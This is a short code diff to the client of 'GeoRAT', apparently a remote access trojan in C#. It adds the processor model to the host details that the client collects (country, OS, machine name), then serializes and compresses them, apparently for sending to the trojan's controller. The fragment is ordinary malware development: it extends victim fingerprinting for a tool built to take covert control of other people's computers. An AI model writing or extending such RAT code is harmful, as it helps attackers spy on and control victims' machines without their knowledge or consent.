@@ -11,6 +11,7 @@ using GeoRAT.Client.CommandHandlers;
 using GeoRAT.Client.Compressor;
 using GeoRAT.Client.Network;
 using GeoRAT.Client.PacketStruct;
+using GeoRAT.Client.PacketStruct.PacketStruct;
 
 namespace GeoRAT.Client
 {
@@ -39,7 +40,7 @@ namespace GeoRAT.Client
 
             Serializer ser = new Serializer();
   
-            Info i = new Info(GetInfo.GetCountry(), GetInfo.GetOS(), GetInfo.Name()); //Geenerate Info object 
+            Info i = new Info(GetInfo.GetCountry(), GetInfo.GetOS(), GetInfo.Name(), GetInfo.GetProcessorModel()); //Geenerate Info object 
             var buf = ser.Serialize(i);
             var cmp = Compression.Compress(buf); //Compress data using GZIP 
             var len = cmp.Length;
